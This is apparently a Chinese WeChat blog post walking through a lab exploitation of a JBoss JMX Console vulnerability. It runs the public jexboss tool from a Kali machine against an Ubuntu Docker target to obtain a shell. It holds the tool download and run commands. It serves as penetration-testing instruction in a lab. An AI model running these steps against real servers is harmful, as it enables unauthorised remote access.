> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6tlrAgRsBIsTC7AnlU0W-A)

其实所有的节日，都不是为了礼物和红包而生，而是提醒我们不要忘记爱与被爱，生活需要仪式感，而你需要的是在乎和关爱。。。  

----  网易云热评

小受：Ubuntu20

小攻：Kali2020

一、搭建该漏洞环境

查看上一篇文章：

[Ubuntu20 安装 docker 并部署相关漏洞环境](http://mp.weixin.qq.com/s?__biz=MzI4MDQ5MjY1Mg==&mid=2247487093&idx=1&sn=2cc5741dfbbed9475488e4759111da39&chksm=ebb6e176dcc168605ff003cc57e8544a467b5c504ec412dbea4f9852eee0852969b2203cb9ed&scene=21#wechat_redirect)

二、访问 http://192.168.77.136:8080 / 进入后台，点击 JMX Console

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibticgvIziayaoze4OOQwN0mB9v6hVb5IwvrXguYD2omlSTfbFF1JiagIlrNc37QZj5Q12KUPx4Y9QJjg/640?wx_fmt=png)

三、漏洞利用工具

1、下载地址：https://github.com/joaomatosf/jexboss

2、cd jexboss

3、python3 jexboss.py 会弹出该工具使用方法

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibticgvIziayaoze4OOQwN0mB9vaP8kCLjc1FgFkI3icA3YMg0s7GxtXpNoq4XKmxxO0HHN1PZrUUshHA/640?wx_fmt=png)

4、python3 jexboss.py -u 192.168.77.136:8080

有红色 vulnerable，说明存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibticgvIziayaoze4OOQwN0mB9Zv6trNTlOSYMrCTMq6ZkGOn53ERhtVYcB2yYzuCjibVeic6SGZsdC8ow/640?wx_fmt=png)

5、输入 yes，获取 shell，上面我们已看到 Ubuntu 的相关信息

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibticgvIziayaoze4OOQwN0mB9PRb6xF8rt5nKSDg3w16Z0RXT3tpQiaKNhVUibRFYr2YibXkTUNiaBCLd3w/640?wx_fmt=png)

禁止非法，后果自负

欢迎关注公众号：web 安全工具库

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibticgvIziayaoze4OOQwN0mB9dVtiaiafWK0uLAoO2uibbWcx3PmnjbRT6ZEt4SsBAsKmuaU85XwRe42IA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibticgvIziayaoze4OOQwN0mB9SjBrZAml28CSVnicTBm6S15aSsuT5PM43uw9mYUAesqibyce8ASOOn8A/640?wx_fmt=jpeg)